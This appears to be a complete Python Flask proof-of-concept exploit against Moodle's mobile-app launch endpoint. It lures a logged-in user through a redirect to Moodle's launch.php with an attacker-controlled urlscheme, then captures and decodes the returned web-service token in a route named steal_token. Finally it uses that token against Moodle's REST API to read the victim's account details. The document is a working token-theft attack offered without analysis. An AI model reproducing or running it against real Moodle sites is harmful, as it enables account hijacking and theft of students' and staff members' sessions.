from flask import Flask, request, redirect, url_for
from base64 import b64decode
import requests

app = Flask(__name__)

SERVER = "http://127.0.0.1:5000"

MOODLE_BASE = "https://moodle.somewhere.com"

@app.route("/")
def redirect_to_moodle():
    target = "{}/admin/tool/mobile/launch.php?service=moodle_mobile_app&passport=1&urlscheme={}/x?lol".format(MOODLE_BASE, SERVER)
    return redirect(target, 302)

@app.route("/x")
def steal_token():
    apptoken = request.args["lol://token"]
    decoded = b64decode(apptoken).decode("utf-8")
    try:
        site_id, token, privatetoken = decoded.split(":::")
    except ValueError:
        site_id, token = decoded.split(":::")
        privatetoken = None

    # return "site_id: {}, apptoken: {}, privatetoken: {}".format(site_id, apptoken, privatetoken)
    return redirect(url_for("whoami", token=token))

@app.route("/whoami")
def whoami():
    token = request.args["token"]
    r = requests.post("{}/webservice/rest/server.php?moodlewsrestformat=json&wsfunction=core_webservice_get_site_info".format(MOODLE_BASE), data={"wstoken": token})
    return "<h1>Hey {} </h1>".format(r.json()["fullname"])